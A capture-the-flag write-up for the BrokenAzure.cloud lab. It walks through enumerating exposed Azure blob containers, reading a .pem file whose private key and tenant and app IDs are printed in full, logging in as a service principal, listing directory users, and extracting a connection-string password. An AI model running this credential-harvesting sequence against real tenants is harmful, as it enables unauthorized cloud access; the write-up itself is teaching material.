# BrokenAzure.cloud CTF Challenge Write-Up

This repository contains a detailed write-up for a challenge found on [BrokenAzure.cloud](https://www.brokenazure.cloud/), focusing on the exploitation of Developer Tools and the Security Pane to enumerate and extract sensitive information from Azure storage containers.

## Challenge Overview

The company named SuperCompany B.V. has been working with IT systems for a while now and have an IT team of a whoppin' 2 people. Because the CEO of the company has heard that 'Cloud' is the new way of working, the CEO has asked the IT team to migrate all IT systems to the Azure cloud platform. Sadly, management does not allow the IT team to take courses or trainings to learn more about Azure cloud and so they have to learn as-they-go
<br>
## Scripts
These scripts are found in my github folder, Tools
```bash
https://github.com/Snoozekinezzar/Tools.git
```
<br>

# Challenge 1
<br>

## Tools Utilized

**enumerate_containers.py** : A script designed for enumerating accessible storage containers within a given Azure Storage account.
**list_blobs_info.py** : A script aimed at listing details about blobs within a specific container, including file names, sizes, and modification timestamps.

## Developer tools

By refreshing the page, it is shown in the security pane, that the Azure account name is **supercompanystorage**
```bash
https://supercompanystorage.blob.core.windows.net
```

## Procedure and Discoveries

### Enumerating Storage Containers

The first step involved using the `enumerate_containers.py` script to enumerate storage containers within the `supercompanystorage` account, as showcased below:

```bash
┌──(brokenazure㉿ctf)-[~/Github/Tools]
└─$ ./enumerate_containers.py
Enter the Azure Storage account name: supercompanystorage
Container found: storagecontainer
Found Containers: ['storagecontainer']
```
### Output:
Upon identifying the container name (storagecontainer), the `list_blobs_info.py` script was executed to enumerate blobs within this container. This process revealed the names, sizes, and last modified dates of the blobs:

```bash
┌──(brokenazure㉿ctf)-[~/Github/Tools]
└─$ ./list_blobs_info.py supercompanystorage storagecontainer

List of blobs:
- Name: Employee23187.ovpn, Size: 2921 bytes, Last Modified: Mon, 08 Aug 2022 11:09:12 GMT
- Name: SECURA{C3RT1F1C3T3}.pem, Size: 3002 bytes, Last Modified: Mon, 08 Aug 2022 11:08:05 GMT
- Name: logo.png, Size: 10763 bytes, Last Modified: Mon, 08 Aug 2022 11:08:05 GMT
```

## Uncovered Flags
This investigative effort led to the identification of several files, one of which contained a flag:

<br>

**1st Flag: SECURA{C3RT1F1C3T3}**
<br>
<br>
This flag was located within the file named SECURA{C3RT1F1C3T3}.pem, marking a successful extraction of sensitive data.

<br>

# Challenge 2
<br>

## Tools Utilized

**blob_activator.py**: A script for reading individual blobs within a given Azure Storage account.

## Accessing blobs
The next step involved using the `blob_activator.py` script to access the information inside the blobs I've previously listed using my `list_blobs_info.py`, as showcased below:

```bash
┌──(brokenazure㉿ctf)-[~/Github/Tools]
└─$ ./blob_activator.py
Enter the storage account name: supercompanystorage
Enter the container name: storagecontainer
Enter the blob name: SECURA{C3RT1F1C3T3}.pem
```

### Output:
Using the `blob_activator.py`, I was able to access the Privacy Enhanced Mail file (.pem), *SECURA{C3RT1F1C3T3}.pem*, which contained **certificate**, **private key**, **tenant id** and **application id**.

```bash
-----BEGIN CERTIFICATE-----
MIIDHzCCAgegAwIBAgIUaEcJmhc/7DjCPPyZLV0fWO1gcz8wDQYJKoZIhvcNAQEL
BQAwHzELMAkGA1UEBhMCTkwxEDAOBgNVBAoMB1NlY3VyYSAwHhcNMjIwMzIyMTQz
NjU3WhcNMzIwMzE5MTQzNjU3WjAfMQswCQYDVQQGEwJOTDEQMA4GA1UECgwHU2Vj
dXJhIDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMzepUaYNoTsuWSk
Zb9pgbIJrMEAp9oJuIGNlMgOxMcTHVix6Scb9Q3odWwBE39BhImc+cy8y3OpeuRq
ADo98RIlBv8HkVYdOubR84NZvD/ugZfWJMrNCYFzOrRLeY53OGGgIxVJessyem5l
q/16WzH0I3oRY65vOiEdNYZs0ZGOObtIffxmasz/+UwHWVeyxo8K5SBYAgGxhRPy
tPhQW3s2whpkgXCLIScwrkrHsJvWGtKHqwpgF6vKXdmqGmJcZljLVNeD673SXU0a
uCchxAG4nbQLKOccKvH1A677dSWXOtJ/8S6nJ5S/mdFy9uSSr1Fw85wAtXfb9MmB
UWdFjakCAwEAAaNTMFEwHQYDVR0OBBYEFA/amktAYKEtTAKc7DqKV9K7Cs2EMB8G
A1UdIwQYMBaAFA/amktAYKEtTAKc7DqKV9K7Cs2EMA8GA1UdEwEB/wQFMAMBAf8w
DQYJKoZIhvcNAQELBQADggEBAK5JzdK7q7eYegr93EA+mzm53+qCqdQtdzFOAEzA
dGpQcV9LWKHxbiVMl8/QrGhlD5LNsLmNsrtWKbGAcHMPDPdwWCjsF7YALlou9Js9
lCRwyHaUTIss6YtnRVrcQSsclVzCG5yJoX8PHskGtvzg8Bs1xsPM5H9qXvjUCQqU
9wYNe6QaCbpznNbewoqijLWkwDiHbmuxwBoTp8fFxjtFnBXYsf4oTPKFeBqIKq07
SP9OM5Qp0jQLt54H1NcTNe+6Vw2/11ZH6NOiLgHBIK+50sCiYeh8d35t+PLrH64k
6CXu0gLU3UZeTR65rVpScRGLnS+fLCWgc0MzyuolbBLVYfw=
-----END CERTIFICATE-----
-----BEGIN PRIVATE KEY-----
MIIEvwIBADANBgkqhkiG9w0BAQEFAASCBKkwggSlAgEAAoIBAQDM3qVGmDaE7Llk
pGW/aYGyCazBAKfaCbiBjZTIDsTHEx1YseknG/UN6HVsARN/QYSJnPnMvMtzqXrk
agA6PfESJQb/B5FWHTrm0fODWbw/7oGX1iTKzQmBczq0S3mOdzhhoCMVSXrLMnpu
Zav9elsx9CN6EWOubzohHTWGbNGRjjm7SH38ZmrM//lMB1lXssaPCuUgWAIBsYUT
8rT4UFt7NsIaZIFwiyEnMK5Kx7Cb1hrSh6sKYBeryl3ZqhpiXGZYy1TXg+u90l1N
GrgnIcQBuJ20CyjnHCrx9QOu+3UllzrSf/EupyeUv5nRcvbkkq9RcPOcALV32/TJ
gVFnRY2pAgMBAAECggEBALBvetVOV32oxY1YS8xKWAj1bhMVtnj/8CeawCx/E5cC
7j4pkks9N5GPxjiKwLjSuwss5rEdUvY8WnsGk0WVfN0MiHbwlIkeSVDqNZbEnGxO
wsr6ANurM2mJzF/jtD8ui58AI9a8XoVK5sfWxgVZ79oYkMka2scqQVytZCBt7Ro1
YSrjxI0sMmVpC29tjzkraJrc9xlqzr/ioKR94d5PBbbicRzwuN5f2CcXFZSbAULM
CDHG6raajvlL1aSNQG8Lkouudw1E+1mMM//KPpAjQvkFajt+ugCqmV3fyO8td1W7
ndsDMz6TcRc5syQlsFtZ28R1ugR5AOt/Q2NOG51zZtECgYEA5T8E+85keSjTmkQ4
SUYuFEWFTUBoYsZ644fonntKJz+uMUilf4PP5tYm85Idereq/Wz2MR7YFo+Dhe/C
lUGfMOqp6jGbRO9gwrAYifc9psR86dlPsvwbg1+MkrreqjM+dQYE3BzVBPeIHIaz
OR0S7oJRZiQKzxX6dSPN6yHMQYUCgYEA5MdaSOvS2yssFOWPSajZdM3uJDwvB8yI
A0zTzq/t0xGp4pG4hbbA0DsrlwbW+DFjNmhTUjnGi2xNFuBs2zpZAfZcS70JRi4G
3NSGRbUg2x7xJd+eDtHLfcqVAWS21Qv6cNnjWkIi+zD1mh8kuNpz6hd3MH6lZfuz
FdFIPBGQAtUCgYEAjnnDRCh7A14fXQJHJSsr2kd22JNODQ2kNKM0LMMdTBVk0pZ+
3Shz3th77ueB0NIzwDunKtIrpKHfMS/Y9GCLaqB9p+LayFYqAfXl2mFB/NKje8cm
pGvRQa3xtQPU/VzJ1Xs/K/nzXpnlCy2gV7+9E2UE6AFAgoH7XjA5e4hO5O0CgYEA
qrrK+dhjhwP05bNa91F21uBHc+sl/d/5MN1Iw9ou1XE9IsQ0vDTiN4OwyAhmrNnO
fG/mnlpXfPzZmtTo58HnYruDrVHpdeIrZOmFOsgtONkihW0X+189SSbBhESw3NUP
lOBF9rmceXDUGKxdL0Z3cp8IZ7xbmnv37bQ8//brTfECgYB38BuP+2JifsqhCO4V
QwqzeI6QhETFZNpwBMLua/J6B/beDYNQNylWNmUhMZ5UrL+ZE+q83nHb6OuQvwwm
2JfOQqPWC33oDLgfSCJM4kZIt2K3AIozYmoSbRaS1g5WEL/2Z39/Kg+qjz1cX1UG
h3A+1OWJej8nKg9XTz25Ra1qzg==
-----END PRIVATE KEY-----
-----BEGIN AZURE_DETAILS-----
Tenant id: 4452edfd-a89d-43aa-8b46-a314c219cc50
App-id: b2bfb506-aead-40d8-9e93-6f3e5d752826
-----END AZURE_DETAILS-----
```

## Writing to .pem file and az ad commands
Now that I have the *certificate*, *private key*, *tenant id and *app-id*, I can use az login to access the service principal, but without the subscription (It should be noted that tenant id and app id is usually not in .pem files)

```bash
az login --service-principal -u b2bfb506-aead-40d8-9e93-6f3e5d752826 --tenant 4452edfd-a89d-43aa-8b46-a314c219cc50 --password brokenazure.pem --allow-no-subscriptions
```

### Output:
```bash
┌──┌──(brokenazure㉿ctf)
└─$ az login --service-principal -u b2bfb506-aead-40d8-9e93-6f3e5d752826 --tenant 4452edfd-a89d-43aa-8b46-a314c219cc50 --password brokenazure.pem --allow-no-subscriptions
[
  {
    "cloudName": "AzureCloud",
    "id": "4452edfd-a89d-43aa-8b46-a314c219cc50",
    "isDefault": true,
    "name": "N/A(tenant level account)",
    "state": "Enabled",
    "tenantId": "4452edfd-a89d-43aa-8b46-a314c219cc50",
    "user": {
      "name": "b2bfb506-aead-40d8-9e93-6f3e5d752826",
      "type": "servicePrincipal"
    }
  }
]
```

When running the user list command, I find a list of AD users
```bash
az ad user list
```


### Output:
```bash
┌──┌──(brokenazure㉿ctf)
└─$ az ad user list
[
  {
    "businessPhones": [],
    "displayName": "DevOps",
    "givenName": null,
    "id": "fd871932-d592-4791-989b-53dd81f8c9e5",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": "Password temp changed to SECURA{D4F4ULT_P4SSW0RD}",
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "devops@secvulnapp.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "roy.stultiens@azuredevsecura.onmicrosoft.com Stultiens",
    "givenName": "roy.stultiens@azuredevsecura.onmicrosoft.com",
    "id": "c76d2c74-8bee-4d73-8e81-a24549bafe85",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": "Stultiens",
    "userPrincipalName": "roy.stultiens_azuredevsecura.onmicrosoft.com#EXT#@secvulnapp.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "Roy Stultiens",
    "givenName": null,
    "id": "41cfff23-c2c2-49c2-a8a9-abc0642dc8c5",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "roy@secvulnapp.onmicrosoft.com"
  },
  {
    "businessPhones": [],
    "displayName": "Siebren",
    "givenName": null,
    "id": "16998a3a-15cf-4970-b86a-29922e2559df",
    "jobTitle": null,
    "mail": null,
    "mobilePhone": null,
    "officeLocation": null,
    "preferredLanguage": null,
    "surname": null,
    "userPrincipalName": "siebren@secvulnapp.onmicrosoft.com"
  }
]
```
I found the second flag in `officeLocation` in the user `DevOps`:

<br>

**2nd Flag: SECURA{D4F4ULT_P4SSW0RD}**

<br>

# Challenge 3
<br>

## Accessing Azure FunctionApp
By this the **az functionapp function show** I can access the information inside the functionapp.

### Output:
`Abbreviated output`
```bash
┌──┌──(brokenazure㉿ctf)
└─$ az functionapp function show
return new OkObjectResult("Server=tcp:secureavulnerableserver.database.windows.net,1433;Initial Catalog=securavulnerabledb;Persist Security Info=False;User ID=DevOps;Password=SECURA{C0NN3CT10N_STR1NG};MultipleActiveResultSets=False;Encrypt=True
```

The third flag was inside the `return new OkObjectResult`.

<br>

**3rd Flag: SECURA{C0NN3CT10N_STR1NG}**

<br>

# Challenge 4
<br>

##

## Conclusion
The challenge underscored the critical need for securing Azure storage accounts and containers against unauthorized access. The successful enumeration and extraction of data from inadequately secured containers highlighted potential vulnerabilities, reinforcing the importance of ethical hacking practices and proper authorization prior to conducting vulnerability assessments.
